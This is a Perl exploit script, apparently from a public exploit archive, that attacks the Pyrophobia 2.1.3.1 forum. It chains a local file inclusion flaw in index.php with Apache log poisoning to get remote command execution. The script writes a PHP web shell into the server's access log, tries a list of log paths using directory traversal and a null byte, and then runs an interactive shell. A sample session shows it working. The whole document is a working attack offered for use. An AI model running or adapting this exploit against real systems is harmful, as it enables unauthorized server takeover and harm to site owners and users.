#!/usr/bin/perl

# |----------------------------------------------------------------------------------------------------------------------------------|
# |                     INFORMATIONS                                                                                                 |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |Web Application :  Pyrophobia 2.1.3.1                                                                                             |
# |Download        :  http://surfnet.dl.sourceforge.net/sourceforge/pyrophobia/pyro2_1_3_1.tar.gz                                    |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |Remote Command Execution Exploit via Apache Log Injection                                                                         |
# |by Osirys                                                                                                                         |
# |osirys[at]autistici[dot]org                                                                                                       |
# |osirys.org                                                                                                                        |
# |Thx&Greets to: evilsocket, Fireshot, Todd, str0ke                                                                                 |
# |----------------------------------------------------------------------------------------------------------------------------------|
# |/[path]/index.php is affected to Local File Inclusion vulnerability:
# |[code]
# |<?php
# |<.... code ....>
# |     if($_GET['pid']){ //if page id is set do custom content functions
# |             $pid=stripslashes($_GET['pid']);
# |             $pid=htmlspecialchars($pid);
# |             if ($pid=='') {
# |                  include('modules/index.php');
# |             } elseif (!file_exists('content/'.$pid.'.php')) {
# |                  include('modules/index.php');
# |             } else {
# |                  include('content/'.$pid.'.php');
# |             }
# |     }
# |<.... code ....>
# |[/code]
# |$pid comes from GET directly.
# |Works regardless of php.ini settings !
# |p0c : /[path]/index.php?pid=[lfi]%00

# ------------------------------------------------------------------
# Exploit in action [>!]
# ------------------------------------------------------------------
# osirys[~]>$ perl lfi.txt http://localhost/pyro2_1_3_1/
#
#   ---------------------------------
#      Pyrophobia Forum RCE Sploit
#               (Log Inj)
#               by Osirys
#   ---------------------------------
#
# [*] Injecting evil php code ..
# [*] Cheeking for Apache Logs ..
# [*] Apache Log Injection completed
# [*] Path: /var/log/httpd/access_log
# [!] Hi my master, do your job now [x]
#
# shell[localhost]$> id
# uid=80(apache) gid=80(apache) groups=80(apache)
# shell[localhost]$> pws
# bash: pws: command not found
# shell[localhost]$> pwd
# /home/osirys/web/pyro2_1_3_1
# shell[localhost]$> exit
# [-] Quitting ..
#
# osirys[~]>$
# ------------------------------------------------------------------


use IO::Socket::INET;
use LWP::UserAgent;

my $host       =  $ARGV[0];
my $lfi_path   =  "/index.php?pid=";
my $null_byte  =  "%00";
my $rand_a     =  int(rand 150);
my $rand1      =  "1337".$rand_a."1337";
my $rand_b     =  int(rand 150);
my $rand2      =  "1337".$rand_b."1337";
my $gotcha     =  0;
my $dir_trasv  =  "../../../../../../../../../..";
my @logs_dirs  =  qw(
                      /var/log/httpd/access_log
                      /var/log/httpd/access.log
                      /var/log/httpd/error.log
                      /var/log/httpd/error_log
                      /var/log/access_log
                      /logs/error.log
                      /logs/access.log
                      /var/log/apache/error_log
                      /var/log/apache/error.log
                      /etc/httpd/logs/access_log
                      /usr/local/apache/logs/error_log
                      /etc/httpd/logs/access.log
                      /etc/httpd/logs/error_log
                      /etc/httpd/logs/error.log
                      /usr/local/apache/logs/access_log
                      /usr/local/apache/logs/access.log
                      /var/www/logs/access_log
                      /var/www/logs/access.log
                      /var/log/apache/access_log
                      /var/log/apache/access.log
                      /var/log/access_log
                      /var/www/logs/error_log
                      /var/www/logs/error.log
                      /usr/local/apache/logs/error.log
                      /var/log/error_log
                      /apache/logs/error.log
                      /apache/logs/access.log
                    );

my $php_code   =  "<?php if(get_magic_quotes_gpc()){ \$_GET[cmd]=st".
                  "ripslashes(\$_GET[cmd]);} system(\$_GET[cmd]);?>";

($host) || help("-1");
cheek($host) == 1 || help("-2");
&banner;

$datas = get_input($host);
$datas =~ /(.*) (.*)/;
($h0st,$path) = ($1,$2);


$sock = IO::Socket::INET->new(
                                PeerAddr => $h0st,
                                PeerPort => 80,
                                Proto => "tcp"
                             ) || die "Can't connect to $host:80!\n";

print "[*] Injecting evil php code ..\n";


print $sock "GET /Osirys_log_inj start0".$rand1.$php_code."0end".$rand2." HTTP/1.1\r\n";
print $sock "Host: ".$host."\r\n";
print $sock "Connection: close\r\n\r\n";
close($sock);

print "[*] Cheeking for Apache Logs ..\n";

while (($log = <@logs_dirs>)&&($gotcha != 1)) {
    $tmp_path = $host.$lfi_path.$dir_trasv.$log.$null_byte;
    $re = get_req($tmp_path);
    if ($re =~ /Osirys_log_inj/) {
        $gotcha = 1;
        $log_path = $tmp_path;
        print "[*] Apache Log Injection completed\n";
        print "[*] Path: $log\n";
        print "[!] Hi my master, do your job now [x]\n\n";
        &exec_cmd;
    }
}

$gotcha == 1 || die "[-] Couldn't find Apache Logs\n";

sub exec_cmd {
    $h0st !~ /www\./ || $h0st =~ s/www\.//;
    print "shell[$h0st]\$> ";
    $cmd = <STDIN>;
    $cmd !~ /exit/ || die "[-] Quitting ..\n\n";
    $exec_url = $log_path."&cmd=".$cmd;
    my $re = get_req($exec_url);
    my $content = tag($re);
    if ($content =~ m/start0$rand1(.+)\*0end$rand2/g) {
        my $out = $1;
        $out =~ s/\$/ /g;
        $out =~ s/\*/\n/g;
        chomp($out);
        print "$out\n";
        &exec_cmd;
    }
    else {
        $c++;
        $cmd =~ s/\n//;
        print "bash: ".$cmd.": command not found\n";
        $c < 3 || die "[-] Command are not executed.\n[-] Something wrong. Exploit Failed !\n\n";
        &exec_cmd;
    }

}

sub get_req() {
    $link = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub get_input() {
    my $host = $_[0];
    $host =~ /http:\/\/(.*)/;
    $s_host = $1;
    $s_host =~ /([a-z.-]{1,30})\/(.*)/;
    ($h0st,$path) = ($1,$2);
    $path =~ s/(.*)/\/$1/;
    $full_det = $h0st." ".$path;
    return $full_det;
}

sub tag() {
    my $string = $_[0];
    $string =~ s/ /\$/g;
    $string =~ s/\s/\*/g;
    return($string);
}

sub banner {
    print "\n".
          "  --------------------------------- \n".
          "     Pyrophobia Forum RCE Sploit   \n".
          "              (Log Inj)             \n".
          "              by Osirys             \n".
          "  --------------------------------- \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Input data failed ! \n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path\n\n";
    exit(0);
}

# milw0rm.com [2009-02-23]